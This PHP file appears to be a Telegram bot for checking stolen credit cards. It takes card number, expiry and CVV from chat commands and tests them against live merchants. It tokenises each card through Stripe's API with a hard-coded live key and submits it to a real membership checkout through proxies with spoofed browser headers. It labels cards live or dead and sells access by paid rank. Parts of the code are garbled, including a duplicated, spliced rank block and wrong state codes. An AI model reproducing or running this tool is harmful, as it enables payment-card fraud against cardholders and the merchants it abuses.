<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/bra|\.bra|!bra)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";
 
$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■□□□□ 20%🔴
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★  2001 Insufficient Funds?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■□□□ 40%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 81724: Duplicate card exists?
━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■□□ 60%🟠
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 2044: Declined - Call Issuer?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
   //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A/N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■□ 80%🟣
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8f4c1b3a-b718-4354-9f49-529e223673c6172862&muid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3&sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035&pasted_fields=number&payment_user_agent=stripe.js%2F446752a876%3B+stripe-js-v3%2F446752a876&time_on_page=79322&key=pk_live_p3chKFwYavwRRZRTEF136qvf000QsjBDBL');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

//==================req 1 end===============//
//==================req 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://clobberswap.co.uk/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
  'authority: clobberswap.co.uk',
  'method: POST',
  'path: /membership-account/membership-checkout/',
  'scheme: https',
  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'accept-language: en-GB,en;q=0.6',
  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
  'cookie: __stripe_mid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3;PHPSESSID=0d043d3ac6b31087107cc7de572b22a2;pmpro_visit=1;__stripe_sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035',
  'origin: https://clobberswap.co.uk',
  'referer: https://clobberswap.co.uk/membership-account/membership-checkout/',
  'sec-fetch-dest: document',
  'sec-fetch-mode: navigate',
  'sec-fetch-site: same-origin',
  'user-agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
     );


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username=Thursday&password=thura444&password2=thura444&first_name=THU&last_name=RA&bemail=thur34355%40gmail.com&bconfirmemail=thur34355%40gmail.com&fullname=&date_of_birth%5Bm%5D=6&date_of_birth%5Bd%5D=21&date_of_birth%5By%5D=2000&facebook=Thura&referral=&pmpro_address_1=3+Allen+Street&pmpro_address_2=&pmpro_town_city=New+York&pmpro_postcode=10080&CardType=visa&tos=1&comms_checkbox=1&collect_checkbox=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX3098&ExpirationMonth=06&ExpirationYear=2029');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

//==================req 2 end===============//

  //-------------------Req 6--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.countereditions.com';
$headers[] = 'Referer: https://www.countereditions.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"716.67","additionalInfo":{"billingLine1":"5th Ave","billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"9234736262","billingGivenName":"'.$firstname.'","billingSurname":"'.$lastname.'"},"dfReferenceId":"1_b9b7fcf7-0046-451c-826d-1d2e5e4b2efa","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":347},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.countereditions.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"bc00e723-b52e-448d-9c8f-fb0f5f265353"}}
');
//-------------------Req 6 end--------------//

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%🟢
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//


if (
    strpos($result2, 'Thank you for your membership.') !== false ||
    strpos($result2, "Membership Confirmation") !== false ||
    strpos($result2, 'Your card zip code is incorrect.') !== false ||
    strpos($result2, "Thank You For Donation.") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Success ") !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, "/donations/thank_you?donation_number=") !== false
) {
  $resp = "<b>
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Approved 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Thanks for your donation </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯<code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";
sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
    strpos($result2, "Your card does not support this type of purchase.") !== false ||
    strpos($result2, 'transaction_not_allowed') !== false ||
    strpos($result2, "insufficient_funds") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Your card has insufficient funds.") !== false ||
    strpos($result2, '"status":"success"') !== false ||
    strpos($result2, "stripe_3ds2_fingerprint") !== false
) {
$resp = "<b>
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Approved 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>1000: Approved </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, 'security code is incorrect.') !== false ||
    strpos($result2, 'Error updating default payment method. Your card number is incorrect.') !== false ||
    strpos($result2, "incorrect_cvc") !== false
) {
$resp = "<b>
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Live 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> 2010: Card Issuer Declined CVV </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
$resp = "<b>
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


  </b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
$resp = "<b>
 [火]Hermes Auth 🌩
━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>404 Error</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯ <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

else {
$resp = "<b>
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


  </b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}